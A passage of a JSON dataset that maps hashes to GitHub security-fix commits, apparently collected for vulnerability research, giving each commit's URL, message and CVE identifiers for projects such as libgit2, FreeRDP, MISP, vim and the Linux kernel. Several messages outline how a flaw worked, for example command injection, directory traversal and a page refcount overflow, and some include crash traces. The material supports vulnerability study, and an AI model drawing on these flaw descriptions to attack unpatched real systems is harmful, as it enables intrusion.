    "cveIdsCount": 1
  },
  "070d23a9a4f7a063c0971898bcc11d110f60c4c95603e2b28068b4dbce6dd823": {
    "url": "https://github.com/libgit2/libgit2/commit/3207ddb0103543da8ad2139ec6539f590f9900c1",
    "title": "index: fix out-of-bounds read with invalid index entry prefix length",
    "body": "The index format in version 4 has prefix-compressed entries, where everyindex entry can compress its path by using a path prefix of the previousentry. Since implmenting support for this index format version in commit5625d86 (index: support index v4, 2016-05-17), though, we do notcorrectly verify that the prefix length that we want to reuse isactually smaller or equal to the amount of characters than the length ofthe previous index entry's path. This can lead to a an integer underflowand subsequently to an out-of-bounds read.Fix this by verifying that the prefix is actually smaller than theprevious entry's path length.Reported-by: Krishna Ram Prakash R <krp@gtux.in>Reported-by: Vivek Parikh <viv0411.parikh@gmail.com>",
    "cveIds": [
      "CVE-2018-8098"
    ],
    "cveIdsCount": 1
  },
  "325c0f443d1454d96e4ebfba3812772e2cb12682183312a1be1531fdf17a5f4a": {
    "url": "https://github.com/FreeRDP/FreeRDP/commit/17c363a5162fd4dc77b1df54e48d7bd9bf6b3be7",
    "title": "Fixed CVE-2018-8784",
    "body": "Thanks to Eyal Itkin from Check Point Software Technologies.",
    "cveIds": [
      "CVE-2018-8784"
    ],
    "cveIdsCount": 1
  },
  "a0d1fb14efe6a77c967dbc6130f32b236bf3ed86e253d870b22a726aea31f578": {
    "url": "https://github.com/FreeRDP/FreeRDP/commit/602f4a2e14b41703b5f431de3154cd46a5750a2d",
    "title": "Fixed CVE-2018-8785",
    "body": "Thanks to Eyal Itkin from Check Point Software Technologies.",
    "cveIds": [
      "CVE-2018-8785"
    ],
    "cveIdsCount": 1
  },
  "e46818d599474e317385d5d6d316a8c343367034d55b6a5fc9fb07fbcb5c394f": {
    "url": "https://github.com/Studio-42/elFinder/commit/157f471d7e48f190f74e66eb5bc73360b5352fd3",
    "title": "[php:security] fix directory traversal vulnerability",
    "body": "Fixed vulnerability that can delete arbitrary files with zipdl command.Fixed it because there was a possibility that files that can be deletedmay be deleted by the execution account of the web server.Reviewed-by: Ravindra Rajaram <ravindra.rajaram@ca.com> and Kevin Kotas <kevin.kotas@ca.com>",
    "cveIds": [
      "CVE-2018-9109"
    ],
    "cveIdsCount": 1
  },
  "f9dbe5c1ae59629b7e41ccbce3147532042ddeaba0e6b4c32daa0bdb8f8357f0": {
    "url": "https://github.com/Studio-42/elFinder/commit/e6351557b86cc10a7651253d2d2aff7f6b918f8e",
    "title": "[php:security] re-fix directory traversal vulnerability for windows s…",
    "body": "…erverrel. commit 157f471",
    "cveIds": [
      "CVE-2018-9110"
    ],
    "cveIdsCount": 1
  },
  "d1043298db5caeffd2a52e634f9b70dee468afe6fb24704a61839ebd452a22f9": {
    "url": "https://github.com/Yubico/yubico-pam/commit/0f6ceabab0a8849b47f67d727aa526c2656089ba",
    "title": "util: make sure to close the authfile before returning success",
    "body": "fixes #136",
    "cveIds": [
      "CVE-2018-9275"
    ],
    "cveIdsCount": 1
  },
  "f6081f96f0429afd31ff3cafb53acd3a08ed3f8aaf22f219e0e2e41f45a9db61": {
    "url": "https://github.com/mantisbt/mantisbt/commit/1fbcd9bca2f2c77cb61624d36ddee4b3802c38ea",
    "title": "Prevent cloning private issues by unauthorized users",
    "body": "Using a crafted request on bug_report_page.php (modifying the 'm_id'parameter), any user with REPORTER access or above is able to view anyprivate issue's details (summary, description, steps to reproduce,additional information) when cloning. By checking the 'Copy issue notes'and 'Copy attachments' checkboxes and completing the clone operation,this data also becomes public (except private notes).Credits to Mustafa Hasan (strukt) strukt93@gmail.com for the finding.@atrol noted that the same vulnerability also existed in bug_report.php,although in this case the information disclosure is limited to notes andattachments (issue data itself does not become accessible).Added an access level check, so that the operation now fails with anAccess Denied error in both cases.Fixes #24221, CVE-2018-9839Prevent cloning private issues by unauthorized usersUsing a crafted request on bug_report_page.php (modifying the 'm_id'parameter), any user with REPORTER access or above is able to view anyprivate issue's details (summary, description, steps to reproduce,additional information) when cloning. By checking the 'Copy issue notes'and 'Copy attachments' checkboxes and completing the clone operation,this data also becomes public (except private notes).Added an access level check, so that the operation now fails with anAccess Denied error.Credits to Mustafa Hasan (strukt) strukt93@gmail.com for the finding.Fixes #24221",
    "cveIds": [
      "CVE-2018-9839"
    ],
    "cveIdsCount": 1
  },
  "58d1a8dcf1d7f5d9d8c3e883a06179b239e6b30fa19091d35125d2ddfa616fc4": {
    "url": "https://github.com/phpipam/phpipam/commit/fd37bd8fb2b9c306079db505e0e3fe79a096c31c",
    "title": "Bugfix: XSS in subnet-scan-telnet.php, CSRF in subnet-scan-execute.php.",
    "body": "Fixes #2327",
    "cveIds": [
      "CVE-2019-1000010"
    ],
    "cveIdsCount": 1
  },
  "59e1fcbb876f6760e7f6636a4d6065e7665f495155eb203ca1b6382add196daa": {
    "url": "https://github.com/libarchive/libarchive/pull/1120/commits/65a23f5dbee4497064e9bb467f81138a62b0dae1",
    "title": "7zip: fix crash when parsing certain archives",
    "body": "Fuzzing with CRCs disabled revealed that a call to get_uncompressed_data()would sometimes fail to return at least 'minimum' bytes. This can causethe crc32() invocation in header_bytes to read off into invalid memory.A specially crafted archive can use this to cause a crash.An ASAN trace is below, but ASAN is not required - an uninstrumentedbinary will also crash.==7719==ERROR: AddressSanitizer: SEGV on unknown address 0x631000040000 (pc 0x7fbdb3b3ec1d bp 0x7ffe77a51310 sp 0x7ffe77a51150 T0)==7719==The signal is caused by a READ memory access. #0 0x7fbdb3b3ec1c in crc32_z (/lib/x86_64-linux-gnu/libz.so.1+0x2c1c) #1 0x84f5eb in header_bytes (/tmp/libarchive/bsdtar+0x84f5eb) #2 0x856156 in read_Header (/tmp/libarchive/bsdtar+0x856156) #3 0x84e134 in slurp_central_directory (/tmp/libarchive/bsdtar+0x84e134) #4 0x849690 in archive_read_format_7zip_read_header (/tmp/libarchive/bsdtar+0x849690) #5 0x5713b7 in _archive_read_next_header2 (/tmp/libarchive/bsdtar+0x5713b7) #6 0x570e63 in _archive_read_next_header (/tmp/libarchive/bsdtar+0x570e63) #7 0x6f08bd in archive_read_next_header (/tmp/libarchive/bsdtar+0x6f08bd) #8 0x52373f in read_archive (/tmp/libarchive/bsdtar+0x52373f) #9 0x5257be in tar_mode_x (/tmp/libarchive/bsdtar+0x5257be) #10 0x51daeb in main (/tmp/libarchive/bsdtar+0x51daeb) #11 0x7fbdb27cab96 in __libc_start_main /build/glibc-OTsEL5/glibc-2.27/csu/../csu/libc-start.c:310 #12 0x41dd09 in _start (/tmp/libarchive/bsdtar+0x41dd09)This was primarly done with afl and FairFuzz. Some early corpus entriesmay have been generated by qsym.",
    "cveIds": [
      "CVE-2019-1000019"
    ],
    "cveIdsCount": 1
  },
  "a2ccc65357d65f5492ddcbeef474aba47748a89251ce082e21f748ecd6de0471": {
    "url": "https://github.com/MISP/MISP/commit/586cca384be6710b03e14bcbeb7588c1772604ec",
    "title": "fix: [security] Fix to a reflected XSS in the default layout template",
    "body": "- as reported by Tuscany Internet eXchange | Misp Team | TIX CyberSecurity",
    "cveIds": [
      "CVE-2019-10254"
    ],
    "cveIdsCount": 1
  },
  "0d58e741b93d35286b1d9e357ab929a7392c32b1d1682831335d9c69a40393e4": {
    "url": "https://github.com/robo-code/robocode/commit/836c84635e982e74f2f2771b2c8640c3a34221bd#diff-0296a8f9d4a509789f4dc4f052d9c36f",
    "title": "Bug-406: DNS interaction is not blocked by Robocode's security manage…",
    "body": "…r + test(s) to verify the fix",
    "cveIds": [
      "CVE-2019-10648"
    ],
    "cveIdsCount": 1
  },
  "004a6f5bc6d234344b785ced75e38785c1cd1f90aa8d62de0dc7c4707e92cfec": {
    "url": "https://github.com/sequelize/sequelize/commit/9bd0bc111b6f502223edf7e902680f7cc2ed541e",
    "title": "fix(sequelize.json.fn): use common path extraction for mysql/mariadb/…",
    "body": "…sqlite (#11329)",
    "cveIds": [
      "CVE-2019-10752"
    ],
    "cveIdsCount": 1
  },
  "84c4b6dcc8922ad824775b49e617d903170e19b8d27504cec48458717f9ad520": {
    "url": "https://github.com/ioBroker/ioBroker.admin/commit/16b2b325ab47896090bc7f54b77b0a97ed74f5cd",
    "title": "### 3.6.8 (2019-10-09)",
    "body": "* (bluefox) Log paths were sanitized* (bluefox) NPM packages were updated",
    "cveIds": [
      "CVE-2019-10765"
    ],
    "cveIdsCount": 1
  },
  "8950bbd1cab4d14099069b3ded8e227c81cc979610c9b4e0a1e8c5f4ff60729b": {
    "url": "https://github.com/kellyselden/git-diff-apply/commit/106d61d3ae723b4257c2a13e67b95eb40a27e0b5",
    "title": "spawn git clone",
    "body": "to prevent injecting a command",
    "cveIds": [
      "CVE-2019-10776"
    ],
    "cveIdsCount": 1
  },
  "1d5f9478a7716d8fed7d747080b930871512f6d751b1110f1db0d9ecf912c794": {
    "url": "https://github.com/Turistforeningen/node-im-resize/commit/de624dacf6a50e39fe3472af1414d44937ce1f03",
    "title": "fix: check image arguments before processing (#19)",
    "body": "Regex hotfix to check for command injection",
    "cveIds": [
      "CVE-2019-10787"
    ],
    "cveIdsCount": 1
  },
  "0952f7cb724a690e76eddb3acaad7a488cc0a066f069f0b246d9cf0741a4a1c8": {
    "url": "https://github.com/Turistforeningen/node-im-metadata/commit/ea15dddbe0f65694bfde36b78dd488e90f246639",
    "title": "fix: check path argument before processing (#10)",
    "body": "hotfix to re mediate command injection",
    "cveIds": [
      "CVE-2019-10788"
    ],
    "cveIdsCount": 1
  },
  "2aded2d0da1ad1901f287017da6e2c5acc194bfe4c32e5abae06efa81e8f37d5": {
    "url": "https://github.com/MangoRaft/git/commit/9be41081f547d3dcef25e7d7c957bc2a3be2dfe0",
    "title": "Vulnerability: Command Injection",
    "body": "Technical Details from Reporter: The first arguments \"repo\" of function pull() can be controlled by users without any sanitization. This is used within multiple functions within the package. Reporter/Credit: Song Li of Johns Hopkins University",
    "cveIds": [
      "CVE-2019-10802"
    ],
    "cveIdsCount": 1
  },
  "3c17ece43c1e060fdec58a2eb866808cfcf304710b2b0dfd382dca630e55ab26": {
    "url": "https://github.com/torvalds/linux/commit/f958d7b528b1b40c44cfda5eabe2d82760d868c3",
    "title": "mm: make page ref count overflow check tighter and more explicit",
    "body": "We have a VM_BUG_ON() to check that the page reference count doesn'tunderflow (or get close to overflow) by checking the sign of the count.That's all fine, but we actually want to allow people to use a \"get pageref unless it's already very high\" helper function, and we want that oneto use the sign of the page ref (without triggering this VM_BUG_ON).Change the VM_BUG_ON to only check for small underflows (or _very_ closeto overflowing), and ignore overflows which have strayed into negativeterritory.Acked-by: Matthew Wilcox <willy@infradead.org>Cc: Jann Horn <jannh@google.com>Cc: stable@kernel.orgSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>",
    "cveIds": [
      "CVE-2019-11487"
    ],
    "cveIdsCount": 1
  },
  "4d06f496461a0cf0f82139e12bc0ccd856377e512b1af02dd3cd3c464a643568": {
    "url": "https://github.com/torvalds/linux/commit/8fde12ca79aff9b5ba951fce1a2641901b8d8e64",
    "title": "mm: prevent get_user_pages() from overflowing page refcount",
    "body": "If the page refcount wraps around past zero, it will be freed whilethere are still four billion references to it. One of the possibleavenues for an attacker to try to make this happen is by doing direct IOon a page multiple times. This patch makes get_user_pages() refuse totake a new page reference if there are already more than two billionreferences to the page.Reported-by: Jann Horn <jannh@google.com>Acked-by: Matthew Wilcox <willy@infradead.org>Cc: stable@kernel.orgSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>",
    "cveIds": [
      "CVE-2019-11487"
    ],
    "cveIdsCount": 1
  },
  "6df0994e584a622137f7db8ec423bc2a3a1e32b95535dd11242235eb68611a00": {
    "url": "https://github.com/torvalds/linux/commit/88b1a17dfc3ed7728316478fae0f5ad508f50397",
    "title": "mm: add 'try_get_page()' helper function",
    "body": "This is the same as the traditional 'get_page()' function, but insteadof unconditionally incrementing the reference count of the page, it onlydoes so if the count was \"safe\". It returns whether the reference countwas incremented (and is marked __must_check, since the caller obviouslyhas to be aware of it).Also like 'get_page()', you can't use this function unless you alreadyhad a reference to the page. The intent is that you can use thisexactly like get_page(), but in situations where you want to limit themaximum reference count.The code currently does an unconditional WARN_ON_ONCE() if we ever hitthe reference count issues (either zero or negative), as a notificationthat the conditional non-increment actually happened.NOTE! The count access for the \"safety\" check is inherently racy, butthat doesn't matter since the buffer we use is basically half the rangeof the reference count (ie we look at the sign of the count).Acked-by: Matthew Wilcox <willy@infradead.org>Cc: Jann Horn <jannh@google.com>Cc: stable@kernel.orgSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>",
    "cveIds": [
      "CVE-2019-11487"
    ],
    "cveIdsCount": 1
  },
  "1cf417c5d64d72da22cea1df37821e149c51f02fe7a589706c35d468430f42b1": {
    "url": "https://github.com/torvalds/linux/commit/6b3a707736301c2128ca85ce85fb13f60b5e350a",
    "title": "Merge branch 'page-refs' (page ref overflow)",
    "body": "Merge page ref overflow branch.Jann Horn reported that he can overflow the page ref count withsufficient memory (and a filesystem that is intentionally extremelyslow).Admittedly it's not exactly easy. To have more than four billionreferences to a page requires a minimum of 32GB of kernel memory justfor the pointers to the pages, much less any metadata to keep track ofthose pointers. Jann needed a total of 140GB of memory and a speciallycrafted filesystem that leaves all reads pending (in order to not everfree the page references and just keep adding more).Still, we have a fairly straightforward way to limit the two obvioususer-controllable sources of page references: direct-IO like pagereferences gotten through get_user_pages(), and the splice pipe pageduplication. So let's just do that.* branch page-refs: fs: prevent page refcount overflow in pipe_buf_get mm: prevent get_user_pages() from overflowing page refcount mm: add 'try_get_page()' helper function mm: make page ref count overflow check tighter and more explicit",
    "cveIds": [
      "CVE-2019-11487"
    ],
    "cveIdsCount": 1
  },
  "8d4ae43ff351e69641458a66546e2d7fdd2871da6be1fcdb45427591fb027145": {
    "url": "https://github.com/torvalds/linux/commit/15fab63e1e57be9fdb5eec1bbc5916e9825e9acb",
    "title": "fs: prevent page refcount overflow in pipe_buf_get",
    "body": "Change pipe_buf_get() to return a bool indicating whether it succeededin raising the refcount of the page (if the thing in the pipe is a page).This removes another mechanism for overflowing the page refcount. Allcallers converted to handle a failure.Reported-by: Jann Horn <jannh@google.com>Signed-off-by: Matthew Wilcox <willy@infradead.org>Cc: stable@kernel.orgSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>",
    "cveIds": [
      "CVE-2019-11487"
    ],
    "cveIdsCount": 1
  },
  "362e6f75c05ec809eedf2bc5f9ac0cd83795f8eaa07601e03404bf2307e0901a": {
    "url": "https://github.com/memcached/memcached/commit/d35334f368817a77a6bd1f33c6a5676b2c402c02",
    "title": "fix segfault in \"lru\" command",
    "body": "fixes #474 - off by one in token count.",
    "cveIds": [
      "CVE-2019-11596"
    ],
    "cveIdsCount": 1
  },
  "a6b5d4bdc371b159809de41e31bc7e1f17be904c626ace15838d733804ec6ad9": {
    "url": "https://github.com/torvalds/linux/commit/bcf3b67d16a4c8ffae0aa79de5853435e683945c",
    "title": "scsi: megaraid_sas: return error when create DMA pool failed",
    "body": "when create DMA pool for cmd frames failed, we should return -ENOMEM,instead of 0.In some case in: megasas_init_adapter_fusion() -->megasas_alloc_cmds() -->megasas_create_frame_pool create DMA pool failed, --> megasas_free_cmds() [1] -->megasas_alloc_cmds_fusion() failed, then goto fail_alloc_cmds. -->megasas_free_cmds() [2]we will call megasas_free_cmds twice, [1] will kfree cmd_list,[2] will use cmd_list.it will cause a problem:Unable to handle kernel NULL pointer dereference at virtual address00000000pgd = ffffffc000f70000[00000000] *pgd=0000001fbf893003, *pud=0000001fbf893003,*pmd=0000001fbf894003, *pte=006000006d000707Internal error: Oops: 96000005 [#1] SMP Modules linked in: CPU: 18 PID: 1 Comm: swapper/0 Not tainted task: ffffffdfb9290000 ti: ffffffdfb923c000 task.ti: ffffffdfb923c000 PC is at megasas_free_cmds+0x30/0x70 LR is at megasas_free_cmds+0x24/0x70 ... Call trace: [<ffffffc0005b779c>] megasas_free_cmds+0x30/0x70 [<ffffffc0005bca74>] megasas_init_adapter_fusion+0x2f4/0x4d8 [<ffffffc0005b926c>] megasas_init_fw+0x2dc/0x760 [<ffffffc0005b9ab0>] megasas_probe_one+0x3c0/0xcd8 [<ffffffc0004a5abc>] local_pci_probe+0x4c/0xb4 [<ffffffc0004a5c40>] pci_device_probe+0x11c/0x14c [<ffffffc00053a5e4>] driver_probe_device+0x1ec/0x430 [<ffffffc00053a92c>] __driver_attach+0xa8/0xb0 [<ffffffc000538178>] bus_for_each_dev+0x74/0xc8 [<ffffffc000539e88>] driver_attach+0x28/0x34 [<ffffffc000539a18>] bus_add_driver+0x16c/0x248 [<ffffffc00053b234>] driver_register+0x6c/0x138 [<ffffffc0004a5350>] __pci_register_driver+0x5c/0x6c [<ffffffc000ce3868>] megasas_init+0xc0/0x1a8 [<ffffffc000082a58>] do_one_initcall+0xe8/0x1ec [<ffffffc000ca7be8>] kernel_init_freeable+0x1c8/0x284 [<ffffffc0008d90b8>] kernel_init+0x1c/0xe4Signed-off-by: Jason Yan <yanaijie@huawei.com>Acked-by: Sumit Saxena <sumit.saxena@broadcom.com>Signed-off-by: Martin K. Petersen <martin.petersen@oracle.com>",
    "cveIds": [
      "CVE-2019-11810"
    ],
    "cveIdsCount": 1
  },
  "bf8a59358face4476e4752f8a81d1505a367c3f574814db2e03263c950b24730": {
    "url": "https://github.com/torvalds/linux/commit/401e7e88d4ef80188ffa07095ac00456f901b8c4",
    "title": "ipmi_si: fix use-after-free of resource->name",
    "body": "When we excute the following commands, we got oopsrmmod ipmi_sicat /proc/ioports[ 1623.482380] Unable to handle kernel paging request at virtual address ffff00000901d478[ 1623.482382] Mem abort info:[ 1623.482383] ESR = 0x96000007[ 1623.482385] Exception class = DABT (current EL), IL = 32 bits[ 1623.482386] SET = 0, FnV = 0[ 1623.482387] EA = 0, S1PTW = 0[ 1623.482388] Data abort info:[ 1623.482389] ISV = 0, ISS = 0x00000007[ 1623.482390] CM = 0, WnR = 0[ 1623.482393] swapper pgtable: 4k pages, 48-bit VAs, pgdp = 00000000d7d94a66[ 1623.482395] [ffff00000901d478] pgd=000000dffbfff003, pud=000000dffbffe003, pmd=0000003f5d06e003, pte=0000000000000000[ 1623.482399] Internal error: Oops: 96000007 [#1] SMP[ 1623.487407] Modules linked in: ipmi_si(E) nls_utf8 isofs rpcrdma ib_iser ib_srpt target_core_mod ib_srp scsi_transport_srp ib_ipoib rdma_ucm ib_umad rdma_cm ib_cm dm_mirror dm_region_hash dm_log iw_cm dm_mod aes_ce_blk crypto_simd cryptd aes_ce_cipher ses ghash_ce sha2_ce enclosure sha256_arm64 sg sha1_ce hisi_sas_v2_hw hibmc_drm sbsa_gwdt hisi_sas_main ip_tables mlx5_ib ib_uverbs marvell ib_core mlx5_core ixgbe mdio hns_dsaf ipmi_devintf hns_enet_drv ipmi_msghandler hns_mdio [last unloaded: ipmi_si][ 1623.532410] CPU: 30 PID: 11438 Comm: cat Kdump: loaded Tainted: G E 5.0.0-rc3+ #168[ 1623.541498] Hardware name: Huawei TaiShan 2280 /BC11SPCD, BIOS 1.37 11/21/2017[ 1623.548822] pstate: a0000005 (NzCv daif -PAN -UAO)[ 1623.553684] pc : string+0x28/0x98[ 1623.557040] lr : vsnprintf+0x368/0x5e8[ 1623.560837] sp : ffff000013213a80[ 1623.564191] x29: ffff000013213a80 x28: ffff00001138abb5[ 1623.569577] x27: ffff000013213c18 x26: ffff805f67d06049[ 1623.574963] x25: 0000000000000000 x24: ffff00001138abb5[ 1623.580349] x23: 0000000000000fb7 x22: ffff0000117ed000[ 1623.585734] x21: ffff000011188fd8 x20: ffff805f67d07000[ 1623.591119] x19: ffff805f67d06061 x18: ffffffffffffffff[ 1623.596505] x17: 0000000000000200 x16: 0000000000000000[ 1623.601890] x15: ffff0000117ed748 x14: ffff805f67d07000[ 1623.607276] x13: ffff805f67d0605e x12: 0000000000000000[ 1623.612661] x11: 0000000000000000 x10: 0000000000000000[ 1623.618046] x9 : 0000000000000000 x8 : 000000000000000f[ 1623.623432] x7 : ffff805f67d06061 x6 : fffffffffffffffe[ 1623.628817] x5 : 0000000000000012 x4 : ffff00000901d478[ 1623.634203] x3 : ffff0a00ffffff04 x2 : ffff805f67d07000[ 1623.639588] x1 : ffff805f67d07000 x0 : ffffffffffffffff[ 1623.644974] Process cat (pid: 11438, stack limit = 0x000000008d4cbc10)[ 1623.651592] Call trace:[ 1623.654068] string+0x28/0x98[ 1623.657071] vsnprintf+0x368/0x5e8[ 1623.660517] seq_vprintf+0x70/0x98[ 1623.668009] seq_printf+0x7c/0xa0[ 1623.675530] r_show+0xc8/0xf8[ 1623.682558] seq_read+0x330/0x440[ 1623.689877] proc_reg_read+0x78/0xd0[ 1623.697346] __vfs_read+0x60/0x1a0[ 1623.704564] vfs_read+0x94/0x150[ 1623.711339] ksys_read+0x6c/0xd8[ 1623.717939] __arm64_sys_read+0x24/0x30[ 1623.725077] el0_svc_common+0x120/0x148[ 1623.732035] el0_svc_handler+0x30/0x40[ 1623.738757] el0_svc+0x8/0xc[ 1623.744520] Code: d1000406 aa0103e2 54000149 b4000080 (39400085)[ 1623.753441] ---[ end trace f91b6a4937de9835 ]---[ 1623.760871] Kernel panic - not syncing: Fatal exception[ 1623.768935] SMP: stopping secondary CPUs[ 1623.775718] Kernel Offset: disabled[ 1623.781998] CPU features: 0x002,21006008[ 1623.788777] Memory Limit: none[ 1623.798329] Starting crashdump kernel...[ 1623.805202] Bye!If io_setup is called successful in try_smi_init() but try_smi_init()goes out_err before calling ipmi_register_smi(), so ipmi_unregister_smi()will not be called while removing module. It leads to the resource thatallocated in io_setup() can not be freed, but the name(DEVICE_NAME) ofresource is freed while removing the module. It causes use-after-freewhen cat /proc/ioports.Fix this by calling io_cleanup() while try_smi_init() goes to out_err.and don't call io_cleanup() until io_setup() returns successful to avoidwarning prints.Fixes: 93c303d (\"ipmi_si: Clean up shutdown a bit\")Cc: stable@vger.kernel.orgReported-by: NuoHan Qiao <qiaonuohan@huawei.com>Suggested-by: Corey Minyard <cminyard@mvista.com>Signed-off-by: Yang Yingliang <yangyingliang@huawei.com>Signed-off-by: Corey Minyard <cminyard@mvista.com>",
    "cveIds": [
      "CVE-2019-11811"
    ],
    "cveIdsCount": 1
  },
  "d84fcef3e6979f57b51689dddade73d856c86ab26e330c12dcb3245495dc5895": {
    "url": "https://github.com/MISP/MISP/commit/3a085a6ceea00b3ab674a984dd56c1846ef775ff",
    "title": "fix: [security] Fix persistent xss via discussion links via javascrip…",
    "body": "…t:// links- low impact as it requires user interaction to trigger- as reported by João Lucas Melo Brasio from Elytron Security S.A. (https://elytronsecurity.com)",
    "cveIds": [
      "CVE-2019-11812"
    ],
    "cveIdsCount": 1
  },
  "4bb5139b19112ac41f07f84c9fdda73ea60fbbb22cdeec19d1703c74cdc86c1e": {
    "url": "https://github.com/MISP/MISP/commit/6f6fb678ca07c80cb7d2bdfe5cb0313bb71bd487",
    "title": "fix: [security] Fix persistent xss via link type attributes containin…",
    "body": "…g javascript:// links- low impact as it requires user interaction to trigger- as reported by João Lucas Melo Brasio from Elytron Security S.A. (https://elytronsecurity.com)",
    "cveIds": [
      "CVE-2019-11813"
    ],
    "cveIdsCount": 1
  },
  "33eec9c092ac40bc04907603b35b21d41ea3c5ffffd5d73ef5b7b57f24377a01": {
    "url": "https://github.com/MISP/MISP/commit/62f15433e42fb92e45bd57dd6fc0c0bf53deb6fc",
    "title": "fix: [security] Fix persistent xss due to invalid sanitisation of ima…",
    "body": "…ge names in titles- triggered by expanding a screenshot- as reported by João Lucas Melo Brasio from Elytron Security S.A. (https://elytronsecurity.com)",
    "cveIds": [
      "CVE-2019-11814"
    ],
    "cveIdsCount": 1
  },
  "fed4db7e98ad2491f74ac9552246342a29d0419bfe0f657b3ad7f19ea3060f3f": {
    "url": "https://github.com/vim/vim/commit/53575521406739cf20bbe4e384d88e7dca11f040",
    "title": "patch 8.1.1365: source command doesn't check for the sandbox",
    "body": "Problem: Source command doesn't check for the sandbox. (Armin Razmjou)Solution: Check for the sandbox when sourcing a file.",
    "cveIds": [
      "CVE-2019-12735"
    ],
    "cveIdsCount": 1
  },
  "536ef5fb155ed075376e36fac4dc207cab837bbb2315b6b88e99365fa170de62": {
    "url": "https://github.com/MISP/MISP/commit/36b43f1306873cff87b7aa30cdc1a30b38c9c16a",
    "title": "fix: [security] Org admins could reset credentials for site admins",
    "body": "- org admins have the inherent ability to reset passwords for all of their org's users- this however could be abused if for some reason the host org of an instance would create org admins - the org admin could set a password manually for the site admin or simply use the API key of the site admin to impersonate them- the potential for abuse is very circumstancial as it requires the host org to create lower privilege org admins instead of the usual site admins- only org admins of the same organisation as the site admin could abuse this- as reported by Raymond Schippers",
    "cveIds": [
      "CVE-2019-12794"
    ],
    "cveIdsCount": 1
  },
  "2f81bd829dcf7ad504cb7d88dd91870b376e6965038f60cef00f4e539f86bfe1": {
    "url": "https://github.com/znc/znc/commit/8de9e376ce531fe7f3c8b0aa4876d15b479b7311",
    "title": "Fix remote code execution and privilege escalation vulnerability.",
    "body": "To trigger this, need to have a user already.Thanks for Jeriko One <jeriko.one@gmx.us> for finding and reporting this.CVE-2019-12816",
    "cveIds": [
      "CVE-2019-12816"
    ],
    "cveIdsCount": 1
  },
  "d7b6b4f95e9d62ae2617efa087c499b83f8e242115c4d1673d0e464d9bcd7cdc": {
    "url": "https://github.com/torvalds/linux/commit/58bdd544e2933a21a51eecf17c3f5f94038261b5",
    "title": "net: nfc: Fix NULL dereference on nfc_llcp_build_tlv fails",
    "body": "KASAN report this:BUG: KASAN: null-ptr-deref in nfc_llcp_build_gb+0x37f/0x540 [nfc]Read of size 3 at addr 0000000000000000 by task syz-executor.0/5401CPU: 0 PID: 5401 Comm: syz-executor.0 Not tainted 5.0.0-rc7+ #45Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014Call Trace: __dump_stack lib/dump_stack.c:77 [inline] dump_stack+0xfa/0x1ce lib/dump_stack.c:113 kasan_report+0x171/0x18d mm/kasan/report.c:321 memcpy+0x1f/0x50 mm/kasan/common.c:130 nfc_llcp_build_gb+0x37f/0x540 [nfc] nfc_llcp_register_device+0x6eb/0xb50 [nfc] nfc_register_device+0x50/0x1d0 [nfc] nfcsim_device_new+0x394/0x67d [nfcsim] ? 0xffffffffc1080000 nfcsim_init+0x6b/0x1000 [nfcsim] do_one_initcall+0xfa/0x5ca init/main.c:887 do_init_module+0x204/0x5f6 kernel/module.c:3460 load_module+0x66b2/0x8570 kernel/module.c:3808 __do_sys_finit_module+0x238/0x2a0 kernel/module.c:3902 do_syscall_64+0x147/0x600 arch/x86/entry/common.c:290 entry_SYSCALL_64_after_hwframe+0x49/0xbeRIP: 0033:0x462e99Code: f7 d8 64 89 02 b8 ff ff ff ff c3 66 0f 1f 44 00 00 48 89 f8 48 89 f7 48 89 d6 48 89 ca 4d 89 c2 4d 89 c8 4c 8b 4c 24 08 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 c7 c1 bc ff ff ff f7 d8 64 89 01 48RSP: 002b:00007f9cb79dcc58 EFLAGS: 00000246 ORIG_RAX: 0000000000000139RAX: ffffffffffffffda RBX: 000000000073bf00 RCX: 0000000000462e99RDX: 0000000000000000 RSI: 0000000020000280 RDI: 0000000000000003RBP: 00007f9cb79dcc70 R08: 0000000000000000 R09: 0000000000000000R10: 0000000000000000 R11: 0000000000000246 R12: 00007f9cb79dd6bcR13: 00000000004bcefb R14: 00000000006f7030 R15: 0000000000000004nfc_llcp_build_tlv will return NULL on fails, caller should check it,otherwise will trigger a NULL dereference.Reported-by: Hulk Robot <hulkci@huawei.com>Fixes: eda21f1 (\"NFC: Set MIU and RW values from CONNECT and CC LLCP frames\")Fixes: d646960 (\"NFC: Initial LLCP support\")Signed-off-by: YueHaibing <yuehaibing@huawei.com>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2019-12818"
    ],
    "cveIdsCount": 1
  },
  "d4fcf3e6ad09997c365fe48f5bc3910a95437b32d968a3099121898b3a261109": {
    "url": "https://github.com/torvalds/linux/commit/6ff7b060535e87c2ae14dd8548512abfdda528fb",
    "title": "mdio_bus: Fix use-after-free on device_register fails",
    "body": "KASAN has found use-after-free in fixed_mdio_bus_init,commit 0c692d0 (\"drivers/net/phy/mdio_bus.c: callput_device on device_register() failure\") call put_device()while device_register() fails,give up the last referenceto the device and allow mdiobus_release to be executed,kfreeing the bus. However in most drives, mdiobus_freebe called to free the bus while mdiobus_register fails.use-after-free occurs when access bus again, this patchrevert it to let mdiobus_free free the bus.KASAN report details as below:BUG: KASAN: use-after-free in mdiobus_free+0x85/0x90 drivers/net/phy/mdio_bus.c:482Read of size 4 at addr ffff8881dc824d78 by task syz-executor.0/3524CPU: 1 PID: 3524 Comm: syz-executor.0 Not tainted 5.0.0-rc7+ #45Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014Call Trace: __dump_stack lib/dump_stack.c:77 [inline] dump_stack+0xfa/0x1ce lib/dump_stack.c:113 print_address_description+0x65/0x270 mm/kasan/report.c:187 kasan_report+0x149/0x18d mm/kasan/report.c:317 mdiobus_free+0x85/0x90 drivers/net/phy/mdio_bus.c:482 fixed_mdio_bus_init+0x283/0x1000 [fixed_phy] ? 0xffffffffc0e40000 ? 0xffffffffc0e40000 ? 0xffffffffc0e40000 do_one_initcall+0xfa/0x5ca init/main.c:887 do_init_module+0x204/0x5f6 kernel/module.c:3460 load_module+0x66b2/0x8570 kernel/module.c:3808 __do_sys_finit_module+0x238/0x2a0 kernel/module.c:3902 do_syscall_64+0x147/0x600 arch/x86/entry/common.c:290 